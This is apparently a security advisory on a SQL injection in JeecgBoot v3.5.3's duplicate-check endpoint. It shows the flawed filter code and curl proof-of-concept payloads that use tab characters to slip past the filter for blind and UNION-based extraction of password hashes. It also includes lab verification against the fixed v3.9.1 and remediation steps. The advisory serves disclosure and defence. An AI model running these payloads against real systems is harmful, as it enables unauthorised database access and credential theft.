# V-J010: JeecgBoot SQL Injection via SqlInjectionUtil Filter Bypass (Whitespace Character Substitution)

## Vulnerability Information

| Item | Detail |
|------|--------|
| Product | JeecgBoot (低代码开发平台) |
| Version | v3.5.3 (and potentially earlier versions) |
| Type | CWE-89: SQL Injection |
| Severity | High |
| Attack Vector | Network (Authenticated, but self-registration is open) |
| Repository | https://github.com/jeecgboot/JeecgBoot |

## Description

JeecgBoot v3.5.3 contains a SQL injection vulnerability in the `/sys/duplicate/check` endpoint caused by an incomplete SQL injection filter bypass. The `SqlInjectionUtil.filterContent()` method checks for SQL keywords followed by **space characters only** (e.g., `"select "`, `"union "`, `"and "`), but fails to account for other SQL-valid whitespace characters such as tab (`%09`), newline (`%0a`), and carriage return (`%0d`).

MySQL and most SQL databases treat tab, newline, carriage return, and space as equivalent whitespace in SQL statements. By substituting spaces with tabs in SQL injection payloads, an attacker can bypass the filter and inject arbitrary SQL.

### Root Cause

**File**: `SqlInjectionUtil.java` (line 24, 88-93)

```java
private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|"
    + "gtid_subtract|exec |insert |select |delete |update |drop |count |chr |mid |master |"
    + "truncate |char |declare |;|or |+|user()";

// ...
for (int i = 0; i < xssArr.length; i++) {
    if (value.indexOf(xssArr[i]) > -1) {  // Uses indexOf with SPACE after keywords
        throw new RuntimeException("SQL injection detected");
    }
}
```

The filter splits `XSS_STR` by `|` and checks if each keyword substring exists in the input using `indexOf()`. Keywords like `"select "` require a trailing **space** character. However:

- `SELECT%09` (tab after SELECT) → `indexOf("select ")` returns **-1** → **BYPASS**
- `UNION%09` → not in the blocked list at all → **BYPASS**
- `FROM%09` → not in the blocked list at all → **BYPASS**

### Additional Filter Gaps

1. **No `--` comment blocking**: SQL single-line comments (`--`) are not blocked (only `/*...*/` and `sleep()` are checked in `checkSqlAnnotation()`)
2. **`UNION` not blocked**: The keyword `UNION` is completely absent from the filter
3. **`FROM` not blocked**: The keyword `FROM` is absent
4. **`WHERE` not blocked**: The keyword `WHERE` is absent
5. **`BENCHMARK` not blocked**: Can be used for time-based injection (instead of blocked `SLEEP`)

## Vulnerability Details

### Endpoint: `/sys/duplicate/check`

**Controller**: `DuplicateCheckController.java`

```java
@RequestMapping(value = "/check", method = RequestMethod.GET)
public Result<String> doDuplicateCheck(DuplicateCheckVo duplicateCheckVo, HttpServletRequest request) {
    final String[] sqlInjCheck = {duplicateCheckVo.getTableName(), duplicateCheckVo.getFieldName()};
    SqlInjectionUtil.filterContent(sqlInjCheck);  // BYPASSABLE FILTER
    // ...
    num = sysDictMapper.duplicateCheckCountSqlNoDataId(duplicateCheckVo);
}
```

**Mapper**: `SysDictMapper.xml` (line 107)

```xml
<select id="duplicateCheckCountSqlNoDataId" resultType="Long">
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}
</select>
```

Both `${tableName}` and `${fieldName}` use MyBatis raw interpolation (`${}`) and are directly controllable via HTTP GET parameters.

### Authentication

The `/sys/duplicate/check` endpoint requires authentication (not in the Shiro `anon` filter list). However, JeecgBoot v3.5.3 allows **open user registration** via `/sys/user/register` (which IS in the `anon` list). An attacker can:

1. Register a new account via `/sys/user/register` (unauthenticated)
2. Login to obtain a JWT token
3. Use the token to access `/sys/duplicate/check` with the bypass payload

## Proof of Concept

### Step 1: Register Account (Unauthenticated)

```bash
curl -X POST "http://<target>/jeecg-boot/sys/user/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!","phone":"13800000001"}'
```

### Step 2: Login to Get Token

```bash
TOKEN=$(curl -s -X POST "http://<target>/jeecg-boot/sys/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!"}' | jq -r '.result.token')
```

### Step 3: Boolean-Based Blind SQL Injection

```bash
# Test if admin user exists (true condition - returns "该值不可用")
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'admin%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"

# Test false condition (returns "该值可用")  
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'nonexistent%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Step 4: Time-Based Blind SQL Injection (using BENCHMARK instead of blocked SLEEP)

```bash
# If admin exists, response delays ~3 seconds
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09IF(SUBSTRING(username,1,5)='admin',BENCHMARK(10000000,SHA1('test')),0)--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Step 5: UNION-Based Data Extraction

```bash
# Extract password hash (response will differ based on data)
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09UNION%09ALL%09SELECT%09CONV(HEX(SUBSTRING(password,1,8)),16,10)%09FROM%09sys_user%09LIMIT%091--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Filter Bypass Explanation

| Original Payload | Blocked By | Tab-Bypass Payload | Filter Result |
|---|---|---|---|
| `UNION SELECT` | `"select "` | `UNION%09SELECT` | PASS (tab != space) |
| `1 OR 1=1` | `"or "` | `1%09OR%091=1` | PASS (tab != space) |
| `; DROP TABLE` | `";"` | N/A | BLOCKED (`;` has no space requirement) |
| `SLEEP(5)` | `checkSqlAnnotation` | `BENCHMARK(...)` | PASS (BENCHMARK not blocked) |
| `-- comment` | Not blocked | `-- comment` | PASS (no `--` check) |

## Affected Files

| File | Line | Issue |
|------|------|-------|
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 24, 88-93 | Filter uses `indexOf` with space-only keywords |
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 283-298 | `checkSqlAnnotation` missing `--` check |
| `jeecg-module-system/.../DuplicateCheckController.java` | 55-56 | Uses bypassable filter |
| `jeecg-module-system/.../xml/SysDictMapper.xml` | 102, 107 | `${tableName}`, `${fieldName}` raw interpolation |
| `jeecg-boot-base-core/.../ShiroConfig.java` | 89 | Open registration enables auth-required attacks |

## Impact

1. **Full Database Read**: Attacker can extract all database contents via blind SQL injection
2. **Low Barrier**: Open user registration means any anonymous attacker can exploit this
3. **Credential Theft**: Can extract admin password hashes for offline cracking
4. **Data Modification**: Possible via stacked queries (MySQL-dependent)
5. **Filter False Sense of Security**: The SqlInjectionUtil provides a false sense of security while being bypassable

## Comparison: v3.5.3 vs Latest

| Feature | v3.5.3 (Vulnerable) | Latest (v3.9.1) |
|---------|---------------------|------------------|
| Table name validation | `indexOf()` keyword check only | Regex: `^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$` |
| Field name validation | `indexOf()` keyword check only | Regex: `^[a-zA-Z0-9_]+$` |
| `--` comment blocking | Not blocked | Blocked |
| Whitespace bypass | Vulnerable to `%09/%0a/%0d` | Fixed with `isExistSqlInjectKeyword()` regex matching |
| `UNION` keyword | Not in filter | Still not explicitly blocked but mitigated by regex |
| Whitelist/Blacklist | Basic blacklist only | Whitelist + Blacklist + Regex |

## Remediation

1. **Upgrade to latest JeecgBoot**: The latest version (v3.9.1) uses regex-based validation (`^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$`) instead of keyword matching
2. **Replace `${}` with parameterized queries**: Use `#{}` where possible; for table/column names, use strict whitelist validation
3. **Fix whitespace handling**: Replace `indexOf("keyword ")` with regex `\\bkeyword\\s+` to match any whitespace
4. **Block `--` comments**: Add `--` to the SQL injection keyword list
5. **Disable open registration**: Unless explicitly needed, disable `/sys/user/register`

## 实机验证（代码对比 + 运行时测试）

### 验证策略

本报告针对 v3.5.3 编写。当前部署实例为 v3.9.1（已修复），因此：
- **v3.5.3 漏洞**：通过源代码静态分析验证（漏洞明确存在）
- **v3.9.1 修复**：通过运行时测试验证（bypass 被拦截）

### 步骤1：获取认证 Token（使用 v-009 的 mLogin 绕过验证码）

**请求报文**：
```http
POST /jeecg-boot/sys/mLogin HTTP/1.1
Host: 192.168.217.135:18080
Content-Type: application/json

{"username":"admin","password":"123456"}
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"code":200,"result":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}}
```

### 步骤2：正常 duplicate check 请求（无注入）

**请求报文**：
```http
GET /jeecg-boot/sys/duplicate/check?tableName=sys_user&fieldName=username&fieldVal=admin HTTP/1.1
Host: 192.168.217.135:18080
X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"该值不可用，系统中已存在！","code":500,"result":null}
```

（正常行为：`admin` 用户名已存在，返回 "不可用"）

### 步骤3：Tab 字符绕过注入（v3.9.1 已修复，被 regex 拦截）

**请求报文**：
```http
GET /jeecg-boot/sys/duplicate/check?tableName=sys_user%09WHERE%09username%09=%27admin%27--%09&fieldName=id&fieldVal=test HTTP/1.1
Host: 192.168.217.135:18080
X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**响应报文（v3.9.1 拦截）**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"校验失败，存在SQL注入风险！表名不合法，存在sql注入风险!--->sys_user\twhere\tusername\t='admin'--","code":500}
```

**结论**：v3.9.1 使用白名单正则 `^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$` 拦截了 Tab 注入。

### 步骤4：v3.5.3 源代码分析（漏洞存在证明）

**v3.5.3 `SqlInjectionUtil.java`（漏洞版本）**：
```java
// 仅检测"关键词+空格"组合，不检测 Tab/换行
private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|"
    + "exec |insert |select |delete |update |drop |count |chr |mid |master |"
    + "truncate |char |declare |;|or |+|user()";
// UNION、FROM、WHERE 完全未被过滤
```

**v3.9.1 `DuplicateCheckController.java`（已修复版本）**：
```java
// 使用白名单正则验证表名/字段名
String tableNameRegex = "^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$";
String fieldNameRegex = "^[a-zA-Z0-9_]+$";
// 任何包含 Tab、空格或特殊字符的输入均被拒绝
```

**v3.5.3 `SysDictMapper.xml`（存在原始插值）**：
```xml
<!-- ${tableName} 和 ${fieldName} 使用 MyBatis 原始插值，无参数化 -->
<select id="duplicateCheckCountSqlNoDataId" resultType="Long">
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}
</select>
```

在 v3.5.3 中，发送 `tableName=sys_user%09WHERE%091=1--%09` 将绕过 `XSS_STR` 过滤（`WHERE` 和 `1=1` 均未在黑名单中），并直接注入到 SQL 查询中。

## Verification Environment

- Source Code: JeecgBoot v3.5.3 (static code analysis — confirmed vulnerable)
- Runtime Test: JeecgBoot v3.9.1 (deployed at 192.168.217.135:18080 — confirms fix)
- Framework: Spring Boot + MyBatis + Apache Shiro
- Date: 2026-04-14
